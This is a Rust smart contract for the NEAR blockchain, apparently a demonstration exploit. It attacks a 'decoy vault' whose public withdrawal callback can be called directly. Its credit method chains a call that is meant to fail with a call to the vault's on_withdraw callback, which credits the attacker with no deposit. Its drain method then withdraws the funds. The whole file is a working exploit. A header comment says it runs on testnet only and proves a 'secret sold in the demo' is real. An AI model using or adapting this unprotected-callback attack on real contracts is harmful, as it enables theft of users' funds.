//! Exploits the decoy vault. Testnet demo only: it proves the secret sold in the demo is real.
use near_sdk::json_types::U128;
use near_sdk::serde_json::json;
use near_sdk::{env, near, AccountId, Gas, NearToken, Promise};

const NO_DEPOSIT: NearToken = NearToken::from_yoctonear(0);

#[near(contract_state)]
#[derive(Default)]
pub struct Attacker {}

#[near]
impl Attacker {
    /// A call that must fail, then the vault's public callback, which reads that failure and
    /// credits this contract with no deposit.
    pub fn credit(&self, vault: AccountId, amount: U128) -> Promise {
        Promise::new(vault.clone())
            .function_call("no_such_method".to_string(), vec![], NO_DEPOSIT, Gas::from_tgas(5))
            .then(Promise::new(vault).function_call(
                "on_withdraw".to_string(),
                json!({ "account": env::current_account_id(), "amount": amount }).to_string().into_bytes(),
                NO_DEPOSIT,
                Gas::from_tgas(10),
            ))
    }

    pub fn drain(&self, vault: AccountId, amount: U128) -> Promise {
        Promise::new(vault).function_call(
            "withdraw".to_string(),
            json!({ "amount": amount }).to_string().into_bytes(),
            NO_DEPOSIT,
            Gas::from_tgas(30),
        )
    }
}
